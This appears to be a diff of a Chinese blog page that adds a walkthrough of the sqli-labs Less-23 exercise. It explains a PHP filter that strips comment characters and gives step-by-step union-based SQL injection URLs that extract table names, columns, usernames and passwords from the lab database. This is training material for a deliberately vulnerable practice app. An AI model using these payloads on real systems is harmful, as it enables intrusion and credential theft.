@@ -417,14 +417,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        12.9k
+                        13.2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        59 分
+                        61 分
                     </div>
                     
                 
@@ -2033,6 +2033,49 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIEZ
 <pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users#
 base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIEZST00gc2VjdXJpdHkudXNlcnMj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/11/26/UhRg2alQ7oLrTGA.png" alt="less22-4.png"></p>
+<h2 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h2><p>GET型基于错误的去除注释的注入</p>
+<ol>
+<li><p><strong>查看源码</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//filter the comments out so as to comments should not work</span>
+<span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string">"/#/"</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//匹配 “#” 字符</span>
+<span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string">"/--/"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//匹配 “--” 字符</span>
+<span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//空值</span>
+<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将变量 “$id” 中的 “#” 字符，替换为空值</span>
+<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//将变量 “$id” 中的 “--” 字符，替换为空值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p><strong>添加 “单引号” 报错</strong></p>
+</li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/10/ouAJi4TaHQ3N8gE.png" alt="less23-1.png"></p>
+<ol start="3">
+<li><strong>既然这里无法注释，那就把 “单引号” 闭合掉</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=1' or '1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/10/ut6z3PmaeGFkyEw.png" alt="less23-2.png"></p>
+<ol start="4">
+<li><strong>获取数据库登录用户、数据库名</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1'union select 1,user(),database()'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/10/BYROsNzVa6kGZ8i.png" alt="less23-3.png"></p>
+<ol start="5">
+<li><strong>暴表</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/10/l7LUR3NiKcrwdmW.png" alt="less23-4.png"></p>
+<ol start="6">
+<li><strong>爆表中的字段</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/10/CFwnLI58kDKuWP7.png" alt="less23-5.png"></p>
+<ol start="7">
+<li><strong>爆数据</strong></li>
+</ol>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(username) FROM security.users),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2020/02/10/CRlUzM4c5QLKsrH.png" alt="less23-6.png"></p>
+<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(password) FROM security.users),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>注：这一关还可以使用  extractvalue() 和 UpdateXml() 函数进行报错注入，使用延时注入。</p>
+<p><img src="https://i.loli.net/2020/02/10/hIxtvPBi7kLepMV.png" alt="less23-7.png"></p>
 <h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr>
 <h3 id="Less1-1"><a href="#Less1-1" class="headerlink" title="Less1"></a>Less1</h3><p><a href="https://www.cnblogs.com/omnis/p/8311556.html" target="_blank" rel="noopener">【sqli-labs】 less1 GET - Error based - Single quotes - String(GET型基于错误的单引号字符型注入)</a></p>
 <p><a href="https://blog.csdn.net/sdb5858874/article/details/80656123" target="_blank" rel="noopener">SQL注入——联合查询和报错注入</a></p>
@@ -2070,6 +2113,10 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
 <p><a href="http://www.itboth.com/d/Vvmmiy/sqli-labs-sql" target="_blank" rel="noopener">通过sqli-labs学习sql注入——基础挑战之less11-22</a></p>
 <h3 id="Less21-1"><a href="#Less21-1" class="headerlink" title="Less21"></a>Less21</h3><p><a href="http://www.pianshen.com/article/4049219913/" target="_blank" rel="noopener">Sqli-Lab | Less 21-23</a></p>
 <p><a href="https://warwolf767.gitbooks.io/sqli-lab/content/less_21_-_less_30.html" target="_blank" rel="noopener">SQLI-LAB 的 实战记录(Less 21 - Less 30)</a></p>
+<h3 id="Less23-1"><a href="#Less23-1" class="headerlink" title="Less23"></a>Less23</h3><p><a href="https://www.cnblogs.com/omnis/p/8361047.html" target="_blank" rel="noopener">【sqli-labs】 less23 Error based - strip comments (GET型基于错误的去除注释的注入)</a></p>
+<p><a href="https://zhzhdoai.github.io/2018/12/22/sqlilabs23-28/" target="_blank" rel="noopener">sqlilabs23-28</a></p>
+<p><a href="https://blog.csdn.net/qq_21500173/article/details/51964908" target="_blank" rel="noopener">Less - 23 Error Based- no comments</a></p>
+<p><a href="https://blog.csdn.net/Fly_hps/article/details/80285353" target="_blank" rel="noopener">sqli-labs————less 23（高级注入篇）</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -2343,7 +2390,7 @@ base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">60.6k</span>&nbsp;字
+                class="white-color">61k</span>&nbsp;字
                
             
 			
